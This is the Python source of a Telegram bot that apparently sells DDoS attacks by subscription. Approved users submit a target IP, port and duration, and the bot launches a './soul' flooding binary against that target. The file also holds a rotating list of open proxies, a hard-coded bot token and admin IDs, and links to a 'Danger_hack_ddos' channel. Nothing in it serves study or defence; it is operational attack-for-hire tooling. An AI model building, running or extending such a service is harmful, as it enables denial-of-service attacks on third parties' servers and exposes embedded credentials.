#HEADSHOT_BOT2
import os
import telebot
import json
import requests
import logging
import time
import threading
from datetime import datetime, timedelta
import certifi
import random
from subprocess import Popen
from threading import Thread
import asyncio
import aiohttp
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

loop = asyncio.get_event_loop()

TOKEN = '7616979521:AAFZ8fEUaIAGDbOOeoByaOLWGIAVtbS_aYY'
CHANNEL_ID = -1002172184452
ADMIN_ID = 5670958127
error_channel_id = -1002172184452

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

bot = telebot.TeleBot(TOKEN)
REQUEST_INTERVAL = 1
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

# Local JSON file to store user data
USER_DATA_FILE = 'users_data.json'

# Function to read user data from the file
def read_user_data():
    try:
        if os.path.exists(USER_DATA_FILE):
            with open(USER_DATA_FILE, 'r') as file:
                return json.load(file)
        else:
            return {}
    except Exception as e:
        logging.error(f"Error reading user data file: {e}")
        return {}

# Function to write user data to the file
def write_user_data(data):
    try:
        with open(USER_DATA_FILE, 'w') as file:
            json.dump(data, file, indent=4)
    except Exception as e:
        logging.error(f"Error writing to user data file: {e}")

# Function to update user data
def update_user_data(user_id, update_data):
    data = read_user_data()
    data[str(user_id)] = update_data
    write_user_data(data)

# Function to get user data for a specific user
def get_user_data(user_id):
    data = read_user_data()
    return data.get(str(user_id), None)

# Function to update proxy
def update_proxy():
    proxy_list = [
        "https://43.134.234.74:443", "https://175.101.18.21:5678", "https://179.189.196.52:5678", 
        "https://162.247.243.29:80", "https://173.244.200.154:44302", "https://173.244.200.156:64631", 
        "https://207.180.236.140:51167", "https://123.145.4.15:53309", "https://36.93.15.53:65445", 
        "https://1.20.207.225:4153", "https://83.136.176.72:4145", "https://115.144.253.12:23928", 
        "https://78.83.242.229:4145", "https://128.14.226.130:60080", "https://194.163.174.206:16128", 
        "https://110.78.149.159:4145", "https://190.15.252.205:3629", "https://101.43.191.233:2080", 
        "https://202.92.5.126:44879", "https://221.211.62.4:1111", "https://58.57.2.46:10800", 
        "https://45.228.147.239:5678", "https://43.157.44.79:443", "https://103.4.118.130:5678", 
        "https://37.131.202.95:33427", "https://172.104.47.98:34503", "https://216.80.120.100:3820", 
        "https://182.93.69.74:5678", "https://8.210.150.195:26666", "https://49.48.47.72:8080", 
        "https://37.75.112.35:4153", "https://8.218.134.238:10802", "https://139.59.128.40:2016", 
        "https://45.196.151.120:5432", "https://24.78.155.155:9090", "https://212.83.137.239:61542", 
        "https://46.173.175.166:10801", "https://103.196.136.158:7497", "https://82.194.133.209:4153", 
        "https://210.4.194.196:80", "https://88.248.2.160:5678", "https://116.199.169.1:4145", 
        "https://77.99.40.240:9090", "https://143.255.176.161:4153", "https://172.99.187.33:4145", 
        "https://43.134.204.249:33126", "https://185.95.227.244:4145", "https://197.234.13.57:4145", 
        "https://81.12.124.86:5678", "https://101.32.62.108:1080", "https://192.169.197.146:55137", 
        "https://82.117.215.98:3629", "https://202.162.212.164:4153", "https://185.105.237.11:3128", 
        "https://123.59.100.247:1080", "https://192.141.236.3:5678", "https://182.253.158.52:5678", 
        "https://164.52.42.2:4145", "https://185.202.7.161:1455", "https://186.236.8.19:4145", 
        "https://36.67.147.222:4153", "https://118.96.94.40:80", "https://27.151.29.27:2080", 
        "https://181.129.198.58:5678", "https://200.105.192.6:5678", "https://103.86.1.255:4145", 
        "https://171.248.215.108:1080", "https://181.198.32.211:4153", "https://188.26.5.254:4145", 
        "https://34.120.231.30:80", "https://103.23.100.1:4145", "https://194.4.50.62:12334", 
        "https://201.251.155.249:5678", "https://37.1.211.58:1080", "https://86.111.144.10:4145", 
        "https://80.78.23.49:1080"
    ]
    proxy = random.choice(proxy_list)
    telebot.apihelper.proxy = {'https': proxy}
    logging.info("Proxy updated successfully.")

@bot.message_handler(commands=['update_proxy'])
def update_proxy_command(message):
    chat_id = message.chat.id
    try:
        update_proxy()
        bot.send_message(chat_id, "Proxy updated successfully.")
    except Exception as e:
        bot.send_message(chat_id, f"Failed to update proxy: {e}")

# Async loop for handling tasks
async def start_asyncio_loop():
    while True:
        await asyncio.sleep(REQUEST_INTERVAL)

async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./soul {target_ip} {target_port} {duration} 100")
    await process.communicate()

# Function to check if the user is admin
def is_user_admin(user_id, chat_id):
    try:
        return bot.get_chat_member(chat_id, user_id).status in ['administrator', 'creator']
    except:
        return False

@bot.message_handler(commands=['approve', 'disapprove'])
def approve_or_disapprove_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    is_admin = is_user_admin(ADMIN_ID, CHANNEL_ID)
    cmd_parts = message.text.split()

    if not is_admin:
        bot.send_message(chat_id, "*You are not authorized to use this command*", parse_mode='Markdown')
        return

    if len(cmd_parts) < 2:
        bot.send_message(chat_id, "*Invalid command format. Use /approve <user_id> <plan> <days> or /disapprove <user_id>.*", parse_mode='Markdown')
        return

    action = cmd_parts[0]
    target_user_id = int(cmd_parts[1])
    plan = int(cmd_parts[2]) if len(cmd_parts) >= 3 else 0
    days = float(cmd_parts[3]) if len(cmd_parts) >= 4 else 0

    if action == '/approve':
        user_data = get_user_data(target_user_id)
        if plan == 1:  # Instant Plan ??
            if len([u for u in read_user_data().values() if u["plan"] == 1]) >= 9999:
                bot.send_message(chat_id, "*Approval failed: Instant Plan ?? limit reached.*", parse_mode='Markdown')
                return
        elif plan == 2:  # Instant++ Plan ??
            if len([u for u in read_user_data().values() if u["plan"] == 2]) >= 49999:
                bot.send_message(chat_id, "*Approval failed: VIP Plan ?? limit reached.*", parse_mode='Markdown')
                return

        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else datetime.now().date().isoformat()
        update_user_data(target_user_id, {"plan": plan, "valid_until": valid_until, "access_count": 0})
        msg_text = f"*User {target_user_id} approved with plan {plan} for {days} days.*"
    else:  # disapprove
        update_user_data(target_user_id, {"plan": 0, "valid_until": "", "access_count": 0})
        msg_text = f"*User {target_user_id} disapproved and reverted to free.*"

    bot.send_message(chat_id, msg_text, parse_mode='Markdown')
    bot.send_message(CHANNEL_ID, msg_text, parse_mode='Markdown')

@bot.message_handler(commands=['Attack'])
def attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    try:
        user_data = get_user_data(user_id)
        if not user_data or user_data['plan'] == 0:
            bot.send_message(chat_id, "*No Active Plan Found. Please contact the administrator @jks6190.*", parse_mode='Markdown')
            return

        if user_data['plan'] == 2 and len([u for u in read_user_data().values() if u["plan"] == 2]) > 499:
            bot.send_message(chat_id, "*Your VIP Plan ?? is currently not available due to limit reached.*", parse_mode='Markdown')
            return

        bot.send_message(chat_id, "*Enter the target IP, port, and duration (in seconds) separated by spaces.*", parse_mode='Markdown')
        bot.register_next_step_handler(message, process_attack_command)
    except Exception as e:
        logging.error(f"Error in attack command: {e}")

def process_attack_command(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, "*Invalid command format. Please use:\n\nEnter the Target IP, port, and duration (in seconds) separated by spaces.*", parse_mode='Markdown')
            return
        target_ip, target_port, duration = args[0], int(args[1]), int(args[2])

        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"*Port {target_port} is blocked. Please use a different port.*", parse_mode='Markdown')
            return

        bot.send_message(message.chat.id, f"*Attack started ??\n\nHost: {target_ip}\nPort: {target_port}\nTime: {duration}*", parse_mode='Markdown')
        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
        time.sleep(duration)
        bot.send_message(message.chat.id, f"*Attack Finished ????\n\nHost: {target_ip}\nPort: {target_port}\nTime: {duration}*", parse_mode='Markdown')

    except Exception as e:
        logging.error(f"Error in processing attack command: {e}")

@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)

    btn2 = KeyboardButton("VIP Plan ??")
    btn3 = KeyboardButton("Canary Download??")
    btn4 = KeyboardButton("My Account??")
    btn5 = KeyboardButton("Help?")
    btn6 = KeyboardButton("Contact admin??")

    markup.add(btn2, btn3, btn4, btn5, btn6)

    bot.send_message(message.chat.id, "*Choose an option:*", reply_markup=markup, parse_mode='Markdown')

def is_plan_expired(valid_until):
    if valid_until == 'N/A':
        return False  # No valid_until set, treat as no expiration
    current_date = datetime.now().date()  # Get current date
    valid_until_date = datetime.strptime(valid_until, "%Y-%m-%d").date()  # Convert valid_until to date
    return current_date > valid_until_date  # Check if the current date is after the valid_until date

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    if message.text == "VIP Plan ??":
        user_data = get_user_data(message.from_user.id)
        valid_until = user_data.get('valid_until', 'N/A')
        bot.reply_to(message, "*Welcome!*", parse_mode='Markdown')
        if is_plan_expired(valid_until):
            bot.send_message(message.chat.id, "*Your Plan has Expired ??.*", parse_mode='Markdown')
        else:
            attack_command(message)
    elif message.text == "My Account??":
        user_data = get_user_data(message.from_user.id)
        if user_data:
            userid = str(message.chat.id)
            plan = user_data.get('plan', 0)
            valid_until = user_data.get('valid_until', 'N/A')
            bot.send_message(message.chat.id, f"*Your User Id: {userid}\nYour Plan: {plan}\nValid Until: {valid_until}*", parse_mode='Markdown')
        else:
            bot.send_message(message.chat.id, "*No account data found. Please contact the admin @jks6190.*", parse_mode='Markdown')
    elif message.text == "Help?":
        bot.reply_to(message, "*How to DDos ==> JOIN CHANNEL https://t.me/Danger_hack_ddos*", parse_mode='Markdown')
    elif message.text == "Contact admin??":
        bot.reply_to(message, "*@jks6190*", parse_mode='Markdown')
    elif message.text == "Canary Download??":
        bot.send_message(message.chat.id, "*Please use the following link for Canary Download: https://t.me/Danger_hack_ddos/19*", parse_mode='Markdown')
    else:
        bot.reply_to(message, "*Invalid option*", parse_mode='Markdown')

# Start bot polling
if __name__ == "__main__":
    try:
        threading.Thread(target=bot.infinity_polling).start()
        loop.run_until_complete(start_asyncio_loop())
    except Exception as e:
        logging.error(f"Error starting bot: {e}")